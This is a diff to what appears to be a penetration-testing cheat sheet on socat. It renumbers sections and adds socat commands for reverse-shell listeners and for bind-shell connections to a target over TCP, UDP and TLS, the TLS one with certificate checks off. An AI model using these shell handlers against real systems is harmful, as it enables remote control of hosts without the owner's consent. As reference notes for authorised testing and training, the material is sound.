@@ -30,29 +30,31 @@ $ socat -dddd - tcp4:<remote_IP>:<remote_PORT>
 > [!NOTE]
 > Using root privileges to bind a listener to ports below 1024.
 
-## 01 - Reverse Shell Handler
-
-### 1.1 - TCP Method
-
-```
-$ socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
-
-$ socat -d -d tcp4-listen:443 STDOUT
-```
-
-## 02 - Bind Shell Handler
+## 02 - Reverse Shell Handler
 
 ### 2.1 - TCP Method
 
 ```
-$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<target_PORT>
+$ socat FILE:`tty`,raw,echo=0 TCP-LISTEN:<PORT>
+
+$ socat -d -d TCP4-LISTEN:443 STDOUT
 ```
 
-### 2.2 - UDP Method
+## 03 - Bind Shell Handler
 
-TODO: Make another shell handler for UDP
+### 3.1 - TCP Method
 
-### 2.3 - TLS Method
+```
+$ socat FILE:`tty`,raw,echo=0 TCP:<target_IP>:<target_PORT>
+```
+
+### 3.2 - UDP Method
+
+```
+$ socat FILE:`tty`,raw,echo=0 UDP:<target_IP>:<target_PORT>
+```
+
+### 3.3 - TLS Method
 
 ```
 $ socat - OPENSSL:<target_IP>:<target_PORT>,verify=0
